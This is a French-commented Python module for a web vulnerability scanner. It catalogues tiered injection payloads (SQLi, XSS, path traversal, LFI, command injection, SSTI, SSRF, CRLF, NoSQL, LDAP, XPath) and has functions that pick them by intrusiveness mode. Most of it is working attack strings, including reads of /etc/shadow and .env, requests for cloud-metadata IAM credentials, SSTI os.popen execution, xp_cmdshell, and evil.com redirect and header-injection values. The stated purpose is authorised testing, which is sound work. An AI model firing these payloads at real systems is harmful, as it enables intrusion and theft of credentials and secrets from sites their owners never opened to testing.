"""
Catalogue centralisé de payloads pour types de vulnérabilités courants.
Usage: sélectionner des payloads adaptés au type détecté pour rejouer prudemment.

IMPORTANT: À utiliser UNIQUEMENT avec autorisation explicite. Payloads fournis
à titre de validation/démonstration. Évitez toute action destructive.
"""
from typing import Dict, List

# Dictionnaire: type normalisé -> liste de payloads (non destructifs)
PAYLOAD_CATALOG: Dict[str, List[str]] = {
    # SQL Injection (génériques)
    "sql injection": [
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 'a'='a",
        "' OR '1'='1' -- -",
        "admin'--",
        "')) OR '1'='1' -- -",
        "') OR ('1'='1",
        "\" OR \"1\"=\"1\" -- ",
        "') OR 1=1 -- ",
        "1 OR 1=1",
        "1' OR '1'='1' -- ",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "') UNION SELECT NULL,NULL-- ",
        "'/**/OR/**/1=1-- ",
        "' OR 1=1 -- -",
        "' OR 1=1;%00",
        "' OR SLEEP(1)--",
        "';WAITFOR DELAY '0:0:1'--",
        # Boolean-based (safe)
        "' AND '1'='1' -- ",
        "' AND '1'>'0' -- ",
        "') AND (1=1) -- ",
        # Numeric context
        "0 OR 1=1",
        "0) OR 1=1 -- ",
        # Comment variants
        "' OR 1=1/*",
        "') OR 1=1/*",
        "'/**/UNION/**/SELECT/**/NULL--",
    ],
    # XSS (réfléchi) – vecteurs simples
    "cross-site scripting (xss)": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "\"'><script>alert('XSS')</script>",
        "\"><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "javascript:alert(1)",
        "<a href=javascript:alert(1)>x</a>",
        "<svg><a xlink:href=javascript:alert(1)>x</a></svg>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<img src=1 onerror=confirm(1)>",
        "<video><source onerror=alert(1)",
        # Attributs simples
        "' onmouseover=alert(1) x='",
        '" onfocus=alert(1) x="',
        # JSON/JS context switches
        "</script><script>alert(1)</script>",
        # Iframe srcdoc
        "<iframe srcdoc=\"<script>alert(1)<\\/script>\"></iframe>",
        # SVG namespace tricks
        "<svg><script>alert(1)</script></svg>",
        # Tagless / JS protocol & data URIs
        "data:text/html,<script>alert(1)</script>",
        "javascript:confirm(1)",
        # Event variants
        "<img src=x onerror=alert(1) alt=x>",
        "<svg onpointerover=alert(1)>",
        "<div onanimationstart=alert(1) style=animation-name:pop></div>",
        # HTML-encoded evasion
        "<scr\x69pt>alert(1)</scr\x69pt>",
        "<script>alert\x28 1 \x29</script>",
    ],
    # Open Redirect (peut nécessiter des paramètres spécifiques comme url, next, redirect)
    "open redirect": [
        "//example.com",
        "https://example.com",
        "%2f%2fexample.com",
        "///example.com",
        "//@example.com",
        "////example.com",
        "//localhost",
        "//127.0.0.1",
        "//example.com/%2f..",
        "https://evil.com@trusted.com",
        "http://trusted.com\\@evil.com",
        "///%5Cevil.com",
        "///%09evil.com",
        "//%00evil.com",
        "%2F%2Fevil.com",
        # URL-encoded variants and path-based keys
        "%2F%2Ftrusted.test",
        "//trusted.test/%2e%2e",
        "//trusted.test/%2e%2e/%2e%2e",
    ],
    # Path Traversal / LFI (non destructif)
    "path traversal": [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "../../../../etc/hosts",
        "..%2f..%2f..%2f..%2fproc%2fself%2fenviron",
        "..;/..;/..;/..;/etc/passwd",
        "....//....//etc/passwd",
        "....%2f....%2fetc%2fpasswd",
        "....\\....\\windows\\win.ini",
        "../../../../etc/passwd%00",
        "../../../../etc/passwd%23",
        # Unicode and mixed separators
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini",
        "..%252f..%252f..%252f..%252fetc%252fhosts",
        "..%2F..%2F..%2F..%2Fetc%2Fissue",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        # Stream wrappers and context variations
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "php://filter/convert.base64-encode/resource=.env",
        "php://filter/convert.base64-encode/resource=.htaccess",
    ],
    "rfi": [
        "http://example.com/remote.txt",
        "https://example.com/remote.txt",
    ],
    # Command Injection – payloads inoffensifs/observables (pas de suppression de données)
    "command injection": [
        "; echo SAFE_MARK",
        "&& echo SAFE_MARK",
        "| echo SAFE_MARK",
        "; id",
        "| id",
        "&& id",
        "; whoami",
        "& whoami",
        "`id`",
        "$(id)",
        # Cross-platform harmless commands
        "; echo X && echo Y",
        "&& set \u0026\u0026 echo SAFE_MARK",  # Windows safe echo
        "; printf SAFE_MARK",
    ],
    # NoSQL Injection (Mongo)
    "nosql injection": [
        '{"$ne": null}',
        "{\"$gt\": \"\"}",
        "{'$regex': '.*'}",
        "{'$or': [ {}, {} ]}",
        "true",
        "' || 'a'=='a",
        '{"$in":["a","b"]}',
        '{"$exists":true}',
        '{"$eq":"admin"}',
        '{"username":{"$regex":"^admin"}}',
    ],
    # XPath Injection (basique)
    "xpath injection": [
        "(objectClass=*)",
        "*",
        "admin') or '1'='1",
        "') or true() or ('a'='a",
        "] | //* | [",
        ") or count(//*)>0 or (",
        ") or string-length(//text())>0 or (",
    ],
    # XXE (nécessite XML; fourni pour référence)
    "xxe": [
        "<?xml version='1.0'?><!DOCTYPE root [ <!ENTITY xxe 'test'> ]><r>&xxe;</r>",
        "<?xml version='1.0'?><!DOCTYPE root [ <!ENTITY xxe '123'> ]><r><a>&xxe;</a></r>",
        "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY e 'ok'>]><r>&e;</r>",
    ],
    # Template Injection (SSTI) – payloads de détection génériques
    "template injection": [
        "{{7*7}}",
        "{{'a'.upper()}}",
        "${7*7}",
        "#{7*7}",
        "<% 7*7 %>",
        "<%= 7*7 %>",
        "{{*7}}",
        # Safer read-only evaluations across engines
        "{{ 2*'2' }}",
        "{{ 'test'|upper }}",
        "#{ 't' + 'est' }",
    ],
    # LDAP Injection (détection)
    "ldap injection": [
        "(objectClass=*)",
        "*)(uid=*))(|(uid=*)",
        "*",
        "') or '1'='1",
        "(|(cn=*)(uid=*))",
        "(|(uid=*)(mail=*))",
    ],
    # SSRF (non destructif): redirections vers local/localhost/external benign
    "ssrf": [
        "http://127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://localhost/",
        "http://localhost:80/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",
        "http://example.com/callback",
        # Non-sensitive echo endpoints
        "https://httpbin.org/get",
        "https://postman-echo.com/get",
        "https://httpbin.org/anything",
    ],
    # CRLF Injection (basique)
    "crlf injection": [
        "%0d%0aX-Test: injected",
        "%0aX-Test: injected",
        "%0d%0aSet-Cookie: test=1",
        "%0d%0aLocation: //evil.com",
        "%0d%0a%0d%0aInjected-Body",
        # Header folding and spacing
        "%0d%0aX-Test:%20injected",
        "%0d%0aX-Injected:%09yes",
        "%0d%0aX-Original-URL:%20/../../etc/passwd",
    ],
}

# Ensemble optionnel de payloads plus intrusifs (à utiliser uniquement en mode "aggressive").
# Attention: Fournis à des fins de détection; éviter tout effet destructif.
# Payloads "moyennement intrusifs" (NORMAL): plus variés mais toujours prudents
MODERATE_PAYLOAD_CATALOG: Dict[str, List[str]] = {
    "sql injection": [
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1,2--",
        "' OR '1'='1' /*",
        """' OR 1=1 LIMIT 1 --""",
        "') OR 1=1 -- -",
        "1 OR 1=1 -- -",
    ],
    "cross-site scripting (xss)": [
        "<img src=1 onerror=confirm(1)>",
        "<svg onload=confirm(1)>",
        "<a href=javascript:confirm(1)>x</a>",
        "<marquee onstart=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select onfocus=alert(1) autofocus></select>",
        "<math href=javascript:alert(1)>x</math>",
        "<details open ontoggle=confirm(1)",
        "<img src=x onerror=alert(1)>",
        "<textarea autofocus onfocus=alert(1)></textarea>",
        "<iframe srcdoc=\"<script>alert(1)<\\/script>\"></iframe>",
    ],
    "open redirect": [
        "//127.1",
        "//[::1]",
        "%2F%2Fexample.com",
        "//trusted.com/%2e%2e",
    ],
    "path traversal": [
        "....//....//etc/hosts",
        "../../../../etc/issue",
        "..%2f..%2f..%2f..%2fetc%2fissue",
        "..%252f..%252f..%252f..%252fetc%252fissue",
        "..%2f..%2f..%2f..%2fproc%2fself%2fstatus",
    ],
    "lfi": [
        "../../../../etc/issue",
        "..%2f..%2f..%2f..%2fetc%2fissue",
        "php://filter/convert.base64-encode/resource=.htaccess",
    ],
    "command injection": [
        "; echo NORMAL_MARK",
        "&& echo NORMAL_MARK",
        "| echo NORMAL_MARK",
        "`echo NORMAL_MARK`",
        "$(echo NORMAL_MARK)",
        "; printf NORMAL_MARK",
        "& whoami",
    ],
    "nosql injection": [
        "{'$in':['a','b']}",
        "{'$nin':[1,2,3]}",
        "{'$exists':true}",
        "{'$gt': ''}",
    ],
    "xpath injection": [
        "(|(uid=*)(cn=*))",
        "(cn=*)",
        "') or '1'='1",
        ") or string-length(//*)>0 or (",
    ],
    "xxe": [
        "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY e 'ok'>]><r>&e;</r>",
    ],
    "template injection": [
        "{{ 2*'2' }}",
        "${{7*7}}",
        "#{ 7*7 }",
        "<%- 7*7 %>",
    ],
    "ldap injection": [
        "(|(uid=*)(cn=*))",
        "(mail=*)",
        "(|(objectClass=*)(uid=*))",
    ],
    "ssrf": [
        "http://127.0.0.1:8080/",
        "http://localhost:8080/",
        "http://127.0.0.1:8000/",
        "https://httpbin.org/anything",
        "https://postman-echo.com/anything",
    ],
    "crlf injection": [
        "%0d%0aConnection:%20close",
        "%0d%0aCache-Control:%20no-cache",
        "%0d%0aPragma:%20no-cache",
    ],
}

UNSAFE_PAYLOAD_CATALOG: Dict[str, List[str]] = {
    "sql injection": [
        "' OR SLEEP(3)--",
        "1; SELECT version(); --",
        "' UNION SELECT NULL,NULL,NULL--",
        # Boolean-blind time-based (longer)
        "' AND SLEEP(3)-- ",
        "'||pg_sleep(3)--",
    ],
    "cross-site scripting (xss)": [
        "<img src=invalid onerror=prompt(1)",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
        "<iframe srcdoc=\"<img src=x onerror=alert(1)>\"></iframe>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<svg/onload=alert(String.fromCharCode(49))>",
    ],
    "open redirect": [
        "///evil.com",
        "https://evil.com@trusted.com",
        "%2f%2fevil.test",
    ],
    "path traversal": [
        "../../../../proc/self/environ",
        "..%2f..%2f..%2f..%2fwindows%2fwin.ini%00",
        "..%2f..%2f..%2f..%2f..%2fetc%2fshadow",
        "..%252f..%252f..%252f..%252fetc%252fshadow",
    ],
    "command injection": [
        "; env",
        "&& set",  # Windows env
        "| uname -a",
        "; cat /etc/os-release || ver",
    ],
    "nosql injection": [
        '{"$where": "this.value == this.value"}',
        "{'$or':[{'a':{'$ne':1}}, {'a':{'$ne':1}}]}",
        "{'$where':'sleep(500)||true'}",
        '{"$regex":"^(?i)admin"}',
    ],
    "xpath injection": [
        "') or count(//*)>0 or ('a'='a",
        ") or name(//*)='*' or (",
    ],
    "xxe": [
        # Toujours sans requêtes externes
        "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY x 'abc'>]><r>&x;</r>",
    ],
    "template injection": [
        "{{7*'7'}}",
        "{{().__class__.__mro__[1].__subclasses__()}}",
        "${{ 7*7 }}",
    ],
    "ldap injection": [
        "admin*)(&(|(uid=*)))",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/",
        "http://metadata.google.internal/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "crlf injection": [
        "%0d%0aContent-Length:%200%0d%0a%0d%0a",
        "%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
    ],
}

# Payloads EXPERT: plus démonstratifs, à n'utiliser que sur environnement autorisé et maîtrisé.
# Viser des preuves de contrôle (version(), utilisateur DB, uname -a) sans écriture/suppression.
EXPERT_PAYLOAD_CATALOG: Dict[str, List[str]] = {
    "sql injection": [
        # MySQL
        "' UNION SELECT @@version-- ",
        "' UNION SELECT database()-- ",
        "' UNION SELECT user()-- ",
        "' AND extractvalue(1, concat(0x7e,version()))-- ",
        '" AND updatexml(1, concat(0x7e, user()), 1)-- ',
        # PostgreSQL
        "' UNION SELECT version()-- ",
        "' UNION SELECT current_database()-- ",
        # MSSQL
        "' UNION SELECT @@version-- ",
        "';WAITFOR DELAY '0:0:2'--",
        # Oracle (si applicable)
        "' UNION SELECT banner FROM v$version-- ",
        # Information schema (lecture limitée)
        "' UNION SELECT table_name FROM information_schema.tables LIMIT 1-- ",
        "' UNION SELECT column_name FROM information_schema.columns LIMIT 1-- ",
        # Boolean-based advanced
        "' AND extractvalue(1, concat(0x7e,(SELECT database())))-- ",
        "' UNION SELECT table_schema,table_name FROM information_schema.tables LIMIT 1-- ",
        "' UNION SELECT table_name,column_name FROM information_schema.columns LIMIT 1-- ",
    ],
    "command injection": [
        "; uname -a",
        "&& id",
        "| whoami",
        "; ls -la",
        "&& dir",
        "| cat /etc/os-release",
        "&& type C:\\Windows\\win.ini",
        "; ps -ef | head -n 5",
    ],
    "ssrf": [
        # Endpoints métadonnées cloud (sensibles) — EXPERT seulement
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/",
        # GCP (headers requis en pratique, ici URL indicative pour tests app)
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://metadata/computeMetadata/v1/",  # generic internal
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
    ],
    "cross-site scripting (xss)": [
        "\"><svg/onload=prompt(1)>",
        "</script><script>alert(1)</script>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg><script href=data:text/javascript,alert(1)></script></svg>",
        "<iframe srcdoc=\"<svg onload=alert(1)>\"></iframe>",
        "<math><a xlink:href=javascript:alert(1)>x</a></math>",
        "<body onload=alert(document.domain)>",
        "<svg/onload=alert(String.fromCharCode(49))>",
    ],
    "path traversal": [
        "../../../../etc/hosts",
        "..%2f..%2f..%2f..%2fetc%2fhosts",
        "../../../../etc/shadow",
        "..%2f..%2f..%2f..%2fetc%2fshadow",
        "..;/..;/..;/..;/etc/shadow",
        "..%252f..%252f..%252f..%252fetc%252fshadow",
    ],
    "lfi": [
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/shadow",
    ],
    "nosql injection": [
        '{"$where": "this.username && this.username.length > 0"}',
        '{"$where": "sleep(200) || true"}',
        '{"$regex":"^admin"}',
    ],
    "ldap injection": [
        "*)(cn=*))(|(cn=*)",
        "(|(objectClass=*)(uid=*))",
        "(|(mail=*)(uid=*))",
    ],
    "xpath injection": [
        "') or count(//node())>100 or ('a'='a",
        ") or string-length(//text())>0 or (",
    ],
    "template injection": [
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}",
        "<%=`id`%>",
        "${{().__class__.__mro__[1].__subclasses__()}}",
    ],
    "crlf injection": [
        "%0d%0aSet-Cookie:%20session=evil;%20HttpOnly%0d%0a",
        "%0d%0aLocation:%20//evil.test%0d%0a",
        "%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a",
    ],
}

# Mode EXPERT-DEEP: extraction approfondie et, si explicitement autorisé, actions d'écriture contrôlées
# IMPORTANT: Ces payloads peuvent tenter des écritures locales (fichiers temporaires)
# à des fins de preuve. À n'utiliser QUE avec autorisation formelle et supervision.
EXPERT_DEEP_PAYLOAD_CATALOG: Dict[str, List[str]] = {
    # SQLi: dump exhaustif de schéma (noms de tables/colonnes) selon SGBD
    "sql injection": [
        # MySQL
        (
            "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x7c7c) FROM information_schema.tables "
            "WHERE table_schema=database()-- "
        ),
        (
            "' UNION SELECT GROUP_CONCAT(CONCAT(table_name,0x3a,column_name) SEPARATOR 0x7c7c) FROM "
            "information_schema.columns WHERE table_schema=database()-- "
        ),
        # MySQL (optionnel, si FILE autorisé): écriture de preuve
        "' INTO OUTFILE '/tmp/sqli_probe.txt' LINES TERMINATED BY 0x0a -- ",
        # PostgreSQL
        (
            "' UNION SELECT string_agg(table_name,'||') FROM information_schema.tables "
            "WHERE table_schema=current_schema()-- "
        ),
        (
            "' UNION SELECT string_agg(table_name||':'||column_name,'||') FROM information_schema.columns "
            "WHERE table_schema=current_schema()-- "
        ),
        # PostgreSQL (si droits): COPY vers /tmp
        "'; COPY (SELECT 'DEEP_MARK') TO '/tmp/sqli_probe_pg.txt'; -- ",
        # MSSQL (concat limité)
        (
            "' UNION SELECT STUFF((SELECT '||'+TABLE_NAME FROM INFORMATION_SCHEMA.TABLES FOR XML PATH('')),1,2,'')-- "
        ),
        (
            "' UNION SELECT STUFF((SELECT '||'+TABLE_NAME+':'+COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS "
            "FOR XML PATH('')),1,2,'')-- "
        ),
        # MSSQL (si droits): xp_cmdshell ou BCP indicatifs — à adapter selon politique
        "'; EXEC xp_cmdshell 'cmd /c echo DEEP_MARK > %TEMP%\\sqli_probe_mssql.txt'; -- ",
    ],
    # CMDi: inventaires plus profonds (lecture) + écritures de preuve (fichiers temporaires)
    "command injection": [
        "; ps aux | head -n 50",
        "; netstat -an | head -n 50",
        "; ls -la /var/www || dir C:\\inetpub\\wwwroot",
        "; env | head -n 50",
        # Linux/Unix: création fichier témoin
        "; printf DEEP_MARK > /tmp/cmdi_probe.txt && cat /tmp/cmdi_probe.txt",
        "; echo DEEP_MARK >> /tmp/cmdi_probe_append.txt && tail -n 1 /tmp/cmdi_probe_append.txt",
        # Windows: création fichier témoin
        "&& echo DEEP_MARK> C:\\Windows\\Temp\\cmdi_probe.txt & type C:\\Windows\\Temp\\cmdi_probe.txt",
        "&& powershell -NoProfile -Command \"Set-Content -Path $env:TEMP\\cmdi_probe_ps.txt -Value 'DEEP_MARK'\"",
    ],
    # SSRF: endpoints additionnels (lecture)
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials",
        "http://169.254.169.254/latest/meta-data/public-keys/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true",
    ],
    # XSS: variantes supplémentaires (fort signal)
    "cross-site scripting (xss)": [
        "<svg/onload=fetch('https://example.test')>",
        "<details open ontoggle=alert(1)>",
        "<iframe srcdoc=\"<details open ontoggle=alert(1)>\"></iframe>",
        '" autofocus onfocus=alert(1) x="',
    ],
    # Traversal/LFI: fichiers sensibles usuels (lecture)
    "path traversal": [
        "../../../../var/www/html/.env",
        "../../../../app/.env",
        "../../../../etc/apache2/sites-enabled/000-default.conf",
        "../../../../var/log/apache2/access.log",
        "../../../../etc/nginx/sites-enabled/default",
    ],
    "lfi": [
        "php://filter/convert.base64-encode/resource=/var/www/html/.env",
        "php://filter/convert.base64-encode/resource=.env",
    ],
    # NoSQL: where étendu (lecture/temps)
    "nosql injection": [
        '{"$where":"function(){return this.hasOwnProperty(\"username\")}"}',
        '{"$where":"sleep(500)||true"}',
    ],
    # LDAP/XPath: requêtes élargies
    "ldap injection": [
        "(|(uid=*)(mail=*)(cn=*))",
    ],
    "xpath injection": [
        "') or string-length(//*)>0 or ('a'='a",
    ],
    # SSTI: variantes supplémentaires lecture + écritures de preuve contrôlées
    "template injection": [
        "{{ request.__class__.__mro__[1].__subclasses__() }}",
        # Jinja2: écriture d'un marqueur dans /tmp (si autorisé)
        "{{ __import__('os').popen('printf DEEP_MARK > /tmp/ssti_probe.txt').read() }}",
        # Jinja2/Flask (varie selon sandbox)
        (
            "{{ request.application.__globals__.__builtins__.__import__('os').popen('echo DEEP_MARK >> "
            "/tmp/ssti_append.txt').read() }}"
        ),
    ],
    # CRLF: en-têtes multiples
    "crlf injection": [
        "%0d%0aSet-Cookie:%20a=b;%20Secure%0d%0aX-Debug:%201%0d%0a",
    ],
}

# Contextual payload catalog allows targeting specific sink contexts
# without changing existing scanner APIs.
CONTEXTUAL_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    "cross-site scripting (xss)": {
        "html": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ],
        "attribute": [
            "' onmouseover=alert(1) x='",
            '" onfocus=alert(1) x="',
            " onpointerenter=alert(1) ",
        ],
        "url": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "script": [
            "</script><script>alert(1)</script>",
            "<script>alert\x28 1 \x29</script>",
        ],
        # Proof-of-control contexts (benign visual changes)
        "proof-bg-red": [
            "<style>body{background:#ff0044 !important}</style>",
            "<script>document.body.style.background='red'</script>",
            "javascript:(function(){document.body.style.background='red'})()",
            "' onmouseover=\"document.body.style.background='red'\" x='",
        ],
        "proof-banner": [
            (
                "<script>var d=document.createElement('div');d.style='position:fixed;top:0;left:0;right:0;padding:12px;background:#ff0;color:#000;font:14px sans-serif;z-index:9999';d.textContent='XSS CONTROL';document.body.appendChild(d);</script>"
            ),
        ],
        "proof-title": [
            "<script>document.title='SECURED TEST'</script>",
        ],
        "proof-control-panel": [
            (
                """
<script>(function(){try{var s=document.createElement('style');s.textContent='.secCtl{position:fixed;bottom:20px;right:20px;z-index:99999}.secCtl-btn{background:#ff0040;color:#fff;padding:10px 14px;border-radius:6px;border:none;box-shadow:0 2px 8px rgba(0,0,0,.3);cursor:pointer}.secCtl-panel{position:fixed;bottom:70px;right:20px;background:#111;color:#0f0;padding:12px 14px;border:1px solid #0f0;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.4);display:none}.secCtl-panel label{display:block;margin:6px 0}';document.head.appendChild(s);var c=document.createElement('div');c.className='secCtl';var b=document.createElement('button');b.className='secCtl-btn';b.textContent='SECURITY TEST';var p=document.createElement('div');p.className='secCtl-panel';p.innerHTML='<label>Fond: <input id="bg" type="color" value="#ff0040"></label><label>Texte: <input id="fg" type="color" value="#ffffff"></label><button id="reset">Reset</button>';b.onclick=function(){p.style.display=(p.style.display==='none'||!p.style.display)?'block':'none'};p.querySelector('#bg').oninput=function(e){document.body.style.background=e.target.value};p.querySelector('#fg').oninput=function(e){document.body.style.color=e.target.value};p.querySelector('#reset').onclick=function(){document.body.style.background='';document.body.style.color=''};c.appendChild(b);c.appendChild(p);document.body.appendChild(c);}catch(e){}})();</script>
"""
            ),
        ],
    },
    "sql injection": {
        "string": [
            "' OR '1'='1' -- ",
            "' AND '1'='1' -- ",
            "' UNION SELECT NULL--",
        ],
        "numeric": [
            "0 OR 1=1",
            "0) OR 1=1 -- ",
        ],
        "proof-toggle": [
            "' AND '1'='1' -- ",
            "' AND '1'='0' -- ",
        ],
    },
    "path traversal": {
        "linux": [
            "../../../../etc/passwd",
            "../../../../etc/hosts",
        ],
        "windows": [
            "..\\..\\..\\..\\windows\\win.ini",
        ],
        "encoded": [
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252f..%252fetc%252fpasswd",
        ],
        "proof-hosts": [
            "../../../../etc/hosts",
            "..%2f..%2f..%2f..%2fetc%2fhosts",
        ],
    },
    "crlf injection": {
        "headers": [
            "%0d%0aX-Test: injected",
            "%0d%0aSet-Cookie: test=1",
        ],
        "body": [
            "%0d%0a%0d%0aInjected-Body",
        ],
        "proof-header": [
            "%0d%0aX-Proof:%20yes",
        ],
    },
    "open redirect": {
        "proof-external": [
            "https://httpbin.org/get",
            "https://postman-echo.com/get",
        ],
    },
    "nosql injection": {
        "proof-error": [
            '{"$ne": null}',
        ],
    },
    "ldap injection": {
        # Proof payloads to provoke safe filter errors/variations
        "proof-error": [
            "*)(",  # invalid filter to trigger error
            "') or '1'='1",  # causes variation in some backends
        ],
    },
    "ssrf": {
        "proof-echo": [
            "https://httpbin.org/get",
            "https://postman-echo.com/get",
        ],
        "proof-metadata": [
            "http://169.254.169.254/latest/meta-data/",
        ],
    },
    "template injection": {
        # Proof-of-evaluation: harmless arithmetic rendering
        "proof-eval": [
            "{{7*7}}",
            "${7*7}",
        ],
    },
    "xxe": {
        # Proof entity expansion (local, non-network)
        "proof-entity": [
            "<?xml version='1.0'?><!DOCTYPE root [ <!ENTITY xxe 'test'> ]><r>&xxe;</r>",
        ],
    },
    "command injection": {
        # Proof contexts that create benign markers (authorized environments only)
        "proof-marker-file": [
            "; printf PROOF_MARK > /tmp/proof_mark.txt && tail -n 1 /tmp/proof_mark.txt",
            "&& powershell -NoProfile -Command \"Set-Content -Path $env:TEMP\\proof_mark.txt -Value 'PROOF_MARK'\"",
        ],
    },
}

def get_contextual_payloads(vuln_type: str, context: str, mode: str = "safe") -> List[str]:
    """
    Retourne une liste de payloads ciblés pour un `vuln_type` dans un `context` donné.
    Le paramètre `mode` suit les mêmes règles que `get_payloads_for_type_mode`.
    Si aucun payload contextuel n'est défini, retourne les payloads standards du type.

    Contexte typiques:
    - XSS: html, attribute, url, script
    - SQLi: string, numeric
    - Path traversal: linux, windows, encoded
    - CRLF injection: headers, body
    """
    key = normalize_type(vuln_type)
    ctx = (context or "").strip().lower()
    catalog = CONTEXTUAL_PAYLOADS.get(key, {})
    base = get_payloads_for_type_mode(key, mode)
    if ctx in catalog:
        # Merge contextual with base, preserving order and uniqueness
        seen = set()
        out: List[str] = []
        for p in catalog[ctx] + base:
            if p not in seen:
                out.append(p)
                seen.add(p)
        return out
    return base

# Alias simples pour faciliter la correspondance
ALIASES = {
    "sqli": "sql injection",
    "xss": "cross-site scripting (xss)",
    "traversal": "path traversal",
    "open redirect": "open redirect",
    "redirect": "open redirect",
    "lfi": "lfi",
    "path": "path traversal",
    "rfi": "rfi",
    "ci": "command injection",
    "cmdi": "command injection",
    "rce": "command injection",
    "rce (safe)": "command injection",
    "ssti": "template injection",
    "ssti (safe)": "template injection",
    "ssrf": "ssrf",
    "crlf": "crlf injection",
    "xxe (safe)": "xxe",
    "xxe": "xxe",
    "ldap/xpath injection": "ldap injection",
    "xpath": "xpath injection",
}


def normalize_type(vuln_type: str) -> str:
    key = (vuln_type or "").strip().lower()
    if key in PAYLOAD_CATALOG:
        return key
    if key in ALIASES:
        return ALIASES[key]
    # correspondances souples
    for k in PAYLOAD_CATALOG.keys():
        if k in key or key in k:
            return k
    return key


def get_payloads_for_type(vuln_type: str) -> List[str]:
    key = normalize_type(vuln_type)
    return PAYLOAD_CATALOG.get(key, [])


def get_payloads_for_type_mode(vuln_type: str, mode: str) -> List[str]:
    """Retourne les payloads selon le mode:
    - safe / normal: payloads sûrs uniquement (identiques)
    - aggressive: payloads sûrs + extras potentiellement intrusifs
    """
    base = get_payloads_for_type(vuln_type)
    m = mode.strip().lower()
    if m == "safe":
        return base
    # normal = safe + moderate
    moderate = MODERATE_PAYLOAD_CATALOG.get(normalize_type(vuln_type), [])
    if m == "normal":
        seen = set()
        out: List[str] = []
        for p in base + moderate:
            if p not in seen:
                out.append(p)
                seen.add(p)
        return out
    # aggressive = safe + moderate + unsafe (sans expert)
    key = normalize_type(vuln_type)
    extras = UNSAFE_PAYLOAD_CATALOG.get(key, [])
    # expert = ajoute EXPERT uniquement
    if m == "expert":
        expert = EXPERT_PAYLOAD_CATALOG.get(key, [])
        expert_deep = []
    # expert-deep = EXPERT + EXPERT_DEEP (le set le plus intrusif)
    elif m == "expert-deep":
        expert = EXPERT_PAYLOAD_CATALOG.get(key, [])
        expert_deep = EXPERT_DEEP_PAYLOAD_CATALOG.get(key, [])
    else:
        expert = []
        expert_deep = []
    # éviter doublons
    seen = set()
    out: List[str] = []
    for p in base + moderate + extras + expert + expert_deep:
        if p not in seen:
            out.append(p)
            seen.add(p)
    return out
